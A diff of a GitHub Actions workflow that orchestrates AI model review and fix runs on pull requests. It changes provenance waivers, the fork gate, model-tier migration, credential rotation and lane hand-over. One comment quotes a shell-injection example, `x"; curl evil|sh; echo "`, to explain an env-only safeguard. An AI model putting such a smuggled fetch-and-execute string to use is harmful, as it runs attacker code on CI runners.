@@ -101,6 +101,10 @@ jobs:
       head_sha: ${{ steps.pr.outputs.head_sha }}
       base_ref: ${{ steps.pr.outputs.base_ref }}
       pr_author: ${{ steps.pr.outputs.pr_author }}
+      # [#657] TRUE iff this PR was admitted under the orchestrator-class waiver, i.e. its
+      # provenance record is SELF-ATTESTED. Consumed by the outcome step (the draft
+      # requirement stands down) and by the arm (which REFUSES the class outright).
+      self_attested: ${{ steps.pr.outputs.self_attested }}
       impl_provider: ${{ steps.pr.outputs.impl_provider }}
       impl_alias: ${{ steps.pr.outputs.impl_alias }}
       impl_account_h: ${{ steps.pr.outputs.impl_account_h }}
@@ -163,7 +167,20 @@ jobs:
           # the provenance-bound implementer provider in the resolve step below). terra and
           # sonnet are DOCS-ONLY models (maintainer directive 2026-07-18) and this lane is
           # never docs, so a terra/sonnet pin is rejected outright.
-          if model_pin and model_pin not in {"opus5", "fable", "opus", "sol", "luna"}:
+          #
+          # [OPUS-5] LEGACY PIN MIGRATION (maintainer directive 2026-07-26: fable + opus-4.8
+          # retired in favour of opus5). This allowlist is the FIRST thing an in-flight PR's pin
+          # meets. Simply deleting fable/opus from it would SystemExit — i.e. red the run on every
+          # tick, forever — for every PR that had already escalated before the deprecation, and
+          # the failure would be attributed to the PR rather than to the config change. So a
+          # retired tier is MIGRATED UP to its successor here, exactly as worker-pr.py's
+          # pinned_fix_floor/record_model_pin do (scripts/deprecated_models.py is the shared
+          # register). Migrating UP is safe: the fix floor may only ever rise, so a migrated pin
+          # can never re-authorize a tier the original pin forbade. Anything that is neither a
+          # current tier nor a known legacy tier is still rejected outright.
+          legacy_pins = {"fable": "opus5", "opus": "opus5"}
+          model_pin = legacy_pins.get(model_pin, model_pin)
+          if model_pin and model_pin not in {"opus5", "sol", "luna"}:
               raise SystemExit("model_pin must be empty or an escalation-ladder tier")
           if mode == "review" and model_pin:
               raise SystemExit("review mode takes no model pin")
@@ -228,6 +245,7 @@ jobs:
           import re
           import subprocess
           import sys
+          import tomllib
           from pathlib import Path
 
           with open(sys.argv[1], encoding="utf-8") as handle:
@@ -235,11 +253,17 @@ jobs:
           repo = os.environ["TARGET_REPO"]
           mode = os.environ["MODE"]
           fix_kind = os.environ.get("FIX_KIND") or "verdict"
-          if pull.get("state") != "open" or pull.get("draft") is not True:
-              raise SystemExit("pull request is not an open draft")
+          if pull.get("state") != "open":
+              raise SystemExit("pull request is not open")
           head = pull.get("head") or {}
           head_repo = (head.get("repo") or {}).get("full_name")
           head_branch = str(head.get("ref", ""))
+          # FORK GATE FIRST and unconditional (#657 follow-up): once the orchestrator-class
+          # waiver below can stand down the draft / head-ref / author gates, the fork gate has
+          # to be the one no waiver can reach — hoisted above every waivable predicate rather
+          # than left to the accident of ordering, exactly as dispatch-claim.py hoists it.
+          if head_repo != repo:
+              raise SystemExit("pull request head is a fork; refusing to run models on it")
           # sol r6 on #257: the reviewer diffs against the DEFAULT branch; a worker PR
           # retargeted to any other base would be reviewed against one comparison and
           # merged against another — reject it at resolution (the sweep re-derives; a
@@ -251,14 +275,8 @@ jobs:
                                "refusing to review/arm")
           head_sha = str(head.get("sha", ""))
           author = str((pull.get("user") or {}).get("login", ""))
-          if head_repo != repo:
-              raise SystemExit("pull request head is a fork; refusing to run models on it")
-          if not re.fullmatch(r"sparq-agent/issue-([1-9][0-9]*)-[A-Za-z0-9._-]+", head_branch):
-              raise SystemExit("pull request head is not a worker branch")
           if not re.fullmatch(r"[0-9a-f]{40}", head_sha):
               raise SystemExit("pull request head sha is malformed")
-          if not author.endswith("[bot]"):
-              raise SystemExit("pull request author is not a bot")
           labels = sorted({
               label.get("name") for label in (pull.get("labels") or [])
               if isinstance(label, dict) and isinstance(label.get("name"), str)
@@ -316,7 +334,27 @@ jobs:
               "registry_dispatch_claim", Path("registry", "scripts", "dispatch-claim.py"))
           dispatch_claim = importlib.util.module_from_spec(spec)
           spec.loader.exec_module(dispatch_claim)
-          admission_error = dispatch_claim.provenance_admission_error(record, pull["number"])
+          # [OPUS-5 #657] The MASTER-protected half of orchestrator-PR admission, read from the
+          # private `registry` checkout (master) — NEVER from the `registry-ledger` checkout the
+          # provenance record came from. Records live on ledger precisely because master's
+          # required gate rejects direct PUTs, so the record half is a low-authority per-PR
+          # gesture and this list is the reviewed half that bounds which logins it can ever name;
+          # reading both from one branch would collapse the pair. `_policy_row` validates the
+          # whole row, so a malformed list HARD-FAILS this step rather than silently resolving to
+          # "nobody is enrolled". Absent/empty => enrolment OFF => the shape gates stand.
+          spec_enrol = importlib.util.spec_from_file_location(
+              "registry_policy_resolve_enrol", Path("registry", "scripts", "policy-resolve.py"))
+          policy_enrol = importlib.util.module_from_spec(spec_enrol)
+          spec_enrol.loader.exec_module(policy_enrol)
+          with open(Path("registry", "policy", "repos.toml"), "rb") as handle:
+              enrolled_authors = policy_enrol.review_enrolment_authors(
+                  repo, tomllib.load(handle))
+          # THE #657 ADMISSION SEAM. Both facts — "may this PR's draft/head-ref/author shape gates
+          # be waived?" and "does its provenance record admit?" — come from ONE shared function in
+          # dispatch-claim.py, so no predicate lives in this `run:` script that a text probe would
+          # have to guess at. Fail closed: any error is a SystemExit.
+          self_attested, admission_error = dispatch_claim.review_fix_pr_admission(
+              repo, pull, record, enrolled_authors, mode)
           if admission_error:
               raise SystemExit(admission_error)
           impl_provider = record["impl_provider"]
@@ -384,11 +422,26 @@ jobs:
           packages = sorted(label[5:] for label in issue_labels if label.startswith("area:"))
           if any(not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", p) for p in packages):
               raise SystemExit("source issue has an unsafe area:* label")
+          # THE partition reduction — imported, NEVER re-implemented here (registry issue #112; the
+          # 2026-07-26 adopt loop). `package` is derived twice by design: once by the dispatcher
+          # that MINTS the CAS claim (dispatch-claim.plan_package) and once here by the run that
+          # ADOPTS it, and the adopt step below compares the two for EQUALITY. This step used to
+          # carry its own pre-#112 reduction (`packages[0] if packages else "__global__"`), so a PR
+          # whose source issue held TWO `area:*` labels was minted `__global__` and re-derived as
+          # the alphabetically-first area: the adopt step rejected its own dispatcher's claim on
+          # every tick forever (53 of 77 review-fix failures that day, most on one PR). The
+          # identical bug also under-serialized the SELF-claim path below, which leases
+          # `--package "$PACKAGE"` — a multi-area PR reserved one area and left its siblings free
+          # to co-run. `dispatch_claim` is the module loaded above, so this calls the MINTER'S OWN
+          # function object (which itself delegates to lease_schema.plan_package): the two sides of
+          # the adopt comparison are now the same code by construction, not by agreement.
+          package = dispatch_claim.plan_package(packages)
           values = {
               "head_branch": head_branch,
               "head_sha": head_sha,
               "base_ref": str((pull.get("base") or {}).get("ref", "")),
               "pr_author": author,
+              "self_attested": "true" if self_attested else "false",
               "impl_provider": impl_provider,
               "impl_alias": impl_alias,
               "impl_account_h": impl_account_h,
@@ -397,7 +450,7 @@ jobs:
               "security": "true" if security else "false",
               "security_keywords": security_keywords_b64,
               "packages": ",".join(packages),
-              "package": packages[0] if packages else "__global__",
+              "package": package,
           }
           with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
               for key, value in values.items():
@@ -458,8 +511,8 @@ jobs:
           # every chain where fable/opus led; the old tiers stay as TAIL FALLBACKS only, a
           # degradation path so an opus5 capacity outage parks work gracefully instead of
           # stalling the chain. Mirrors dispatch-claim.py REVIEW_CHAIN/FIX_CHAIN.
-          review_chain = {"anthropic": ["sol", "luna"], "openai": ["opus5", "opus", "fable"]}
-          fix_chain = {"anthropic": ["opus5", "fable", "opus"], "openai": ["sol", "luna"]}
+          review_chain = {"anthropic": ["sol", "luna"], "openai": ["opus5"]}
+          fix_chain = {"anthropic": ["opus5"], "openai": ["sol", "luna"]}
           # Escalation ladders in escalation order — weakest tier FIRST, STRONGEST (terminal)
           # tier LAST per the maintainer capability order opus < luna < fable < opus5 < sol
           # (2026-07-24: opus5 is the top ANTHROPIC tier; cross-provider order unchanged) — mirrors
@@ -471,7 +524,7 @@ jobs:
           # later tick instead of burning the extended round budget on the model that already
           # failed; see dispatch-claim.py). A pin outside the implementer provider's ladder
           # fails closed.
-          ladders = {"anthropic": ["opus", "fable", "opus5"], "openai": ["luna", "sol"]}
+          ladders = {"anthropic": ["opus5"], "openai": ["luna", "sol"]}
           # STRUCTURAL ENFORCEMENT (maintainer directive 2026-07-18): terra + sonnet are
           # DOCS-ONLY — review-fix has no docs lane, so their appearance in ANY chain here is a
           # policy defect. Fail closed before any claim can run on the wrong model.
@@ -599,11 +652,17 @@ jobs:
           # Disjoint top-level lease prefixes: `review:`/`fix:` never share a prefix with the
           # impl `<repo>#`, so neither cap counts the other. The shared per-mode prefix bounds
           # concurrent reviews to the static codex slot count (codex is usage-exempt; the CLI
-          # claim path does not usage-gate, so this static cap IS the bound — by design).
+          # claim path does not usage-gate, so this static cap IS the bound — by design). That is
+          # a DELIBERATE divergence from the dispatcher's `account_slot_bound=True` live-slot
+          # bound, which needs a usage probe this path does not have; issue #581.
           # TTL must outlive this workflow's remaining wall-clock (claim -> run -> release) plus
           # queue slack, or the allocator reclaims this still-live account and two sessions race
           # on one credential (issue #159). Kept in sync with dispatch-claim.py REVIEW_TTL/FIX_TTL
           # (which use the DISPATCHER-claim path's longer bound; adopting that bound here is safe).
+          # BOTH numbers below are cross-asserted: dispatch-claim.py's `_review_fix_workflow_values`
+          # parses these `cap=` / `ttl=` literals and its self-test pins them to
+          # SELF_CLAIM_REVIEW_CAP / SELF_CLAIM_FIX_CAP and REVIEW_TTL / FIX_TTL. Editing one side
+          # only turns that self-test RED — change both, or don't change either.
           if [[ "$MODE" == review ]]; then
             prefix="review:"; cap=10; ttl=4200; role=review
           else
@@ -807,6 +866,14 @@ jobs:
       verdict_b64: ${{ steps.handoff.outputs.verdict_b64 }}
       files_b64: ${{ steps.handoff.outputs.files_b64 }}
       fix_done: ${{ steps.fix.outcome }}
+      # Issue #560: whether the recorded verdict was STAGED for the fixer, and the reason it was
+      # not. staged=false means this run produced NOTHING — no fix, no push, no verdict — because
+      # no recorded verdict is bound to the live head. The `outcome` job must then hand the PR from
+      # the FIX lane to the REVIEW lane, or fix-enumeration (which keys on review:changes) re-claims
+      # it on every ~8min dispatch tick while review-enumeration (review:needs) never sees it.
+      # Empty in review mode and for the ci/rebase repair flavours (stage-verdict is skipped there).
+      verdict_staged: ${{ steps.stage-verdict.outputs.staged }}
+      verdict_stale_reason: ${{ steps.stage-verdict.outputs.stale_reason }}
       fix_made_changes: ${{ steps.fix.outputs.fix_made_changes }}
       injection_detected: ${{ steps.fix.outputs.injection_detected }}
       gate_outcome: ${{ steps.gate.outcome }}
@@ -1172,13 +1239,23 @@ jobs:
           WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
         run: bash ../registry/scripts/worker-live.sh fix
 
-      # The provider CLI may refresh the account credential during the run (codex rotates its
-      # auth.json); write it back exactly like worker.yml so the next claim still authenticates.
-      # Runs IMMEDIATELY after the model steps and BEFORE the gate: rotation only happens during
-      # the model call, and REGISTRY_SECRETS_PAT must never be live in a step that runs after
-      # hostile target code executed on this runner (the fix-mode cargo gate below).
+      # Persist a HOST-SIDE-rotated account credential so the next claim still authenticates
+      # (issue #596). Rotation happens in worker-prep's pre-flight refresh, NOT in the container:
+      # the credential file is bind-mounted read-only (issue #134), so the CLI's own in-place
+      # refresh cannot happen there — which is exactly why this lane died. Still runs BEFORE the
+      # gate: REGISTRY_SECRETS_PAT must never be live in a step that runs after hostile target code
+      # executed on this runner (the fix-mode cargo gate below).
       - name: Write back a rotated full account credential
-        if: ${{ always() && steps.prepare.outcome == 'success' && (steps.review.outcome != 'skipped' || steps.fix.outcome != 'skipped') }}
+        # NO model-step guard (issue #596): see worker.yml — a host-side rotation must be
+        # persisted even when the model step never ran, or the consumed grant strands the account.
+        #
+        # NO PREPARE-STEP GUARD EITHER (retro-review of #614): see the long note on the same step in
+        # worker.yml. `steps.prepare.outcome == 'success'` made the write-back reachable only from
+        # the success path of the very step that CONSUMES the one-time-use grant, so a failure after
+        # the provider committed the rotation killed the account permanently. Keyed instead to the
+        # account SELECTION; worker-live.sh's rotation marker decides whether anything needs
+        # persisting, and with no marker this is a rotated=false no-op.
+        if: ${{ always() && steps.selected.outcome == 'success' }}
         env:
           WORKER_ROOT: ${{ runner.temp }}/registry-worker
           WORKER_ACCOUNT: ${{ steps.selected.outputs.account }}
@@ -1205,7 +1282,11 @@ jobs:
           if [[ "$REVIEW_OUTCOME" == "success" || "$FIX_OUTCOME" == "success" ]]; then
             cls=success
           elif [[ "$REVIEW_OUTCOME" == "skipped" && "$FIX_OUTCOME" == "skipped" ]]; then
-            cls=unknown   # pre-launch abort/cancellation: no host-observed CLI exit exists
+            # Pre-launch abort/cancellation: no host-observed CLI exit exists. But worker-prep's
+            # host-side credential pre-flight (issue #596) DOES classify its own failures and writes
+            # WORKER_EXIT_CLASS before any model step can run — recording `unknown` over it would
+            # discard the one signal that says "this account needs a re-mint".
+            cls="${WORKER_EXIT_CLASS:-unknown}"
           else
             cls="${WORKER_EXIT_CLASS:-unknown}"
           fi
@@ -1216,6 +1297,37 @@ jobs:
             echo "reset_hint=${WORKER_RESET_HINT:-}"
             echo "outcome_attempt=${GITHUB_RUN_ATTEMPT:-}"
           } >> "$GITHUB_OUTPUT"
+
+      # [registry #596] A CREDENTIAL-OUTAGE launch failure must NOT consume a review round.
+      # The round marker is written BEFORE the model runs, and the `outcome` job that would void it
+      # is gated (job-level `if`) on a validated verdict / successful fix — so when the model launch
+      # itself dies on the account credential (acct01's codex OAuth access token expires hourly while
+      # the fleet stores a static snapshot of it; observed `model-exit-class=auth` on review-fix runs,
+      # 5 auth vs 5 success in one window, then 2 more) the outcome job is SKIPPED and the round
+      # stayed charged forever. Enough of those and a pure credential outage walked the PR through the
+      # bounded round budget into a capacity park as if the reviewer had declined.
+      #
+      # It runs HERE, in the same job that charged the round, because this is the only place that both
+      # sees the exit class and still runs when no verdict exists. The class gate lives in
+      # worker-pr.is_credential_outage (pure + self-tested), NOT in this `if:` — a non-outage class is
+      # a deliberate no-op, so `setup`/`unknown`/timeouts stay charged and the bounded-crash
+      # accounting is unchanged. The review-scoped App token already present in this job (issues +
+      # pull-requests write, NO target contents write) is exactly what round-record used, so no new
+      # capability is introduced, and in review mode this job executes no target code.
+      - name: Void the review round on a credential-outage exit (never a decline)
+        id: round-void
+        if: ${{ always() && inputs.mode == 'review' && steps.round.outcome == 'success' }}
+        env:
+          GH_TOKEN: ${{ steps.app-token-review.outputs.token }}
+          EXIT_CLASS: ${{ steps.exit-class.outputs.class }}
+        run: |
+          python3 registry/scripts/worker-pr.py round-void \
+            --repo "${{ inputs.target_repo }}" \
+            --pr "${{ inputs.pr_number }}" \
+            --round "${{ inputs.review_round }}" \
+            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
+            --bot-login "${{ steps.target.outputs.bot_login }}" \
+            --exit-class "$EXIT_CLASS"
 
       - name: Ensure a Rust toolchain for the crate-scoped gate
         if: ${{ inputs.mode == 'fix' && steps.fix.outputs.fix_made_changes == 'true' && steps.fix.outputs.injection_detected != 'true' }}
@@ -1292,7 +1404,11 @@ jobs:
   outcome:
     name: Apply ${{ inputs.mode }} outcome (no target code runs here)
     needs: [resolve, claim, run]
-    if: ${{ always() && needs.claim.outputs.acquired == 'true' && (needs.run.outputs.verdict_ok == 'success' || needs.run.outputs.fix_done == 'success') }}
+    # Issue #560 adds the third admission: a fix run that STAGED NOTHING (verdict_stale_reason
+    # non-empty) skips the fix step, so fix_done is 'skipped' and this job used to be skipped with
+    # it — which is exactly why the PR kept review:changes and the fix lane re-admitted it forever.
+    # The lane hand-over below is the only step that runs on that path.
+    if: ${{ always() && needs.claim.outputs.acquired == 'true' && (needs.run.outputs.verdict_ok == 'success' || needs.run.outputs.fix_done == 'success' || needs.run.outputs.verdict_stale_reason != '') }}
     runs-on: ubuntu-latest
     timeout-minutes: 15
     # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY + PROVENANCE_SALT, which
@@ -1369,6 +1485,10 @@ jobs:
           # Catalog-controlled provider reaches this job via env ONLY — never interpolated into the
           # run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
           IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
+          # [#657] Resolved HOST-SIDE in the resolve job (from the master-protected allowlist +
+          # the ledger record), never from a workflow input: the class decides whether the draft
+          # freshness requirement applies and whether an approve may arm.
+          SELF_ATTESTED: ${{ needs.resolve.outputs.self_attested }}
         run: |
           set -euo pipefail
           args=(
@@ -1386,6 +1506,7 @@ jobs:
             --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
           )
           [[ "$SECURITY" == "true" ]] && args+=(--security)
+          [[ "$SELF_ATTESTED" == "true" ]] && args+=(--self-attested)
           while IFS= read -r p; do
             [[ -n "$p" ]] && args+=(--surface-path "$p")
           done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
@@ -1433,6 +1554,10 @@ jobs:
           # would execute (issue #199). worker-pr.py ready-and-arm asserts reviewer != implementer.
           IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
           REVIEWER_PROVIDER: ${{ needs.claim.outputs.provider }}
+          # [#657] The arm REFUSES this class (worker-pr.ready_and_arm): a self-attested record
+          # cannot authorise a merge, because the cross-provider assertion below is derived by
+          # inverting a field the implementer wrote about itself.
+          SELF_ATTESTED: ${{ needs.resolve.outputs.self_attested }}
         run: |
           set -euo pipefail
           args=(
@@ -1448,6 +1573,7 @@ jobs:
             --bot-login "${{ needs.resolve.outputs.pr_author }}"
             --reviewed-base "${{ needs.resolve.outputs.base_ref }}"
           )
+          [[ "$SELF_ATTESTED" == "true" ]] && args+=(--self-attested)
           while IFS= read -r p; do
             [[ -n "$p" ]] && args+=(--surface-path "$p")
           done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
@@ -1507,6 +1633,54 @@ jobs:
             --pushed "${{ needs.run.outputs.pushed }}" \
             --reviewed-sha "${{ needs.run.outputs.pushed == 'true' && needs.run.outputs.pushed_sha || needs.resolve.outputs.head_sha }}" \
             --issue "${{ needs.resolve.outputs.issue }}"
+
+      # Issue #560 — WRONG-LANE SPIN CLOSURE. stage-verdict refused to seed the fixer because no
+      # recorded verdict is bound to the live head (a legacy pre-#156 unbound record, a head that
+      # moved under an update-branch/main merge, or an envelope naming another repo/PR/round), so
+      # this run produced NOTHING. Leaving review:changes on the PR kept it in the FIX lane's bucket
+      # while only the REVIEW lane can mint the head-bound verdict the fixer needs: live 2026-07-24,
+      # sparq#3523/#3542/#3572/#3573/#3608 each launched a fix run per ~8min tick from 08:02Z, every
+      # one completing "success" on `deferring to a fresh review` (~35 wasted runs/hour, each burning
+      # an account claim + a runner) until a human flipped the five labels. Hand the PR over here.
+      #
+      # This is a MACHINE LANE transition, NOT a park: worker-pr.py reads the live hold surface first
+      # (BOTH machine park labels — review:parked on the PR and status:parked on the source issue —
+      # plus the human holds), RE-READS it immediately before writing, and ABORTS the whole hand-over
+      # if any of them landed in between: the park WINS (issue #555) and is never converted into a
+      # human-owned review:needs-user. Every abort is decided BEFORE the first write, so it leaves no
+      # trace at all (#584 follow-up finding 2). It is idempotent, so a re-run or a concurrent claim
+      # that already handed over writes nothing. The fix CLAIM itself (the `fix:<repo>#<pr>` lease
+      # enumerate_review_items single-flights on) is released unconditionally by the `release` job
+      # below, which does not depend on this job — the slot is free before the next tick.
+      #
+      # A live `review:pass` STANDS THE HAND-OVER DOWN entirely (#584 follow-up finding 1) — no lane
+      # write, no marker write, no comment. The fix lane admits on a concluded-RED gate ALONE too
+      # (GAP-A `needs-ci-fix`, review-state-agnostic), so a NON-DRAFT, ARMED, passed PR reaches this
+      # step; retracting its reviewed-sha marker is precisely what makes dispatch-claim's disarm net
+      # read `marker != head` on an armed PR as a safety violation and disable-auto + dequeue +
+      # REDRAFT it. A passed PR has nothing to hand to the review lane either — the pass IS the
+      # verdict.
+      #
+      # `--head-sha` is REQUIRED and load-bearing (round-2 finding 1): the label flip ALONE only
+      # relocates the spin, because a completed request-changes review left `sparq-reviewed-sha ==
+      # head` and a DRAFTED PR carrying that marker is not re-emitted as needs-review — a green gate
+      # instead dispatches a review run whose resolve step exits `already_done` with no work done,
+      # and a pending gate leaves NO lane owning the PR. This is the head the verdict was proved NOT
+      # bound to, so its reviewed-sha assertion is retracted and the review lane provably takes over.
+      - name: Hand a deferred fix back to the review lane (unbound/stale verdict)
+        if: ${{ inputs.mode == 'fix' && needs.run.outputs.verdict_staged == 'false' && needs.run.outputs.verdict_stale_reason != '' }}
+        env:
+          GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
+          # Script-authored value, but it reaches the CLI via env like every other non-literal
+          # (issue #199): never interpolated into this `run:` shell source.
+          STALE_REASON: ${{ needs.run.outputs.verdict_stale_reason }}
+        run: |
+          python3 registry/scripts/worker-pr.py fix-lane-defer \
+            --repo "${{ inputs.target_repo }}" \
+            --pr "${{ inputs.pr_number }}" \
+            --issue "${{ needs.resolve.outputs.issue }}" \
+            --head-sha "${{ needs.resolve.outputs.head_sha }}" \
+            --stale-reason "$STALE_REASON"
 
   # Escalate an unresolvable inverse chain to a human immediately (never silent-queue): if the
   # routing catalog cannot resolve a concrete model for this direction, a human must decide.
